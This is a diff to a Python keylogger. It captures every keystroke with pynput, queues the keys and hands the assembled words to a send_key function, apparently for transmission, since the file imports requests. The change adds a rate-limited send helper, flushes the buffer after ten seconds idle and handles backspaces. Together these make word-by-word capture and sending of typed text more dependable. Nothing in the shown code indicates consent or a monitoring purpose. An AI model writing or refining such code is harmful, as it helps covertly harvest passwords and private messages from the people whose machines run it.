@@ -3,6 +3,8 @@ import threading
 import time
 from queue import Queue, Empty
 from datetime import datetime, timedelta
+from typing import List, Optional
+
 import requests
 from pynput import keyboard
 
@@ -39,33 +41,48 @@ def key_to_str(key):
 def worker(q: Queue):
     count = 0
     window_start = datetime.now()
-    buffer = []
+    buffer: List[str] = []
+    last_key_time: Optional[datetime] = None
+
+    def send_buffer():
+        nonlocal count, window_start, buffer
+        if not buffer:
+            return
+        now = datetime.now()
+        if now - window_start >= timedelta(seconds=1):
+            window_start = now
+            count = 0
+        if count >= 30:
+            sleep_time = (window_start + timedelta(seconds=1) - now).total_seconds()
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+            window_start = datetime.now()
+            count = 0
+        send_key("".join(buffer))
+        count += 1
+        buffer.clear()
+
     while True:
         try:
             key = q.get(timeout=1)
         except Empty:
+            if buffer and last_key_time and datetime.now() - last_key_time >= timedelta(seconds=10):
+                send_buffer()
+                last_key_time = None
             continue
-        if key in (" ", "{return}"):
-            buffer.append(key)
-            now = datetime.now()
-            if now - window_start >= timedelta(seconds=1):
-                window_start = now
-                count = 0
-            if count < 30:
-                send_key("".join(buffer))
-                count += 1
-            else:
-                time.sleep(0.05)
-                window_start = datetime.now()
-                count = 0
-                send_key("".join(buffer))
-                count += 1
-            buffer.clear()
-        elif key == "{backspace}":
+
+        last_key_time = datetime.now()
+
+        if key == "{backspace}":
             if buffer:
                 buffer.pop()
-        else:
-            buffer.append(key)
+            continue
+
+        buffer.append(key)
+
+        if key in (" ", "{return}"):
+            send_buffer()
+            last_key_time = None
 
 def on_press(key):
     key_str = key_to_str(key)
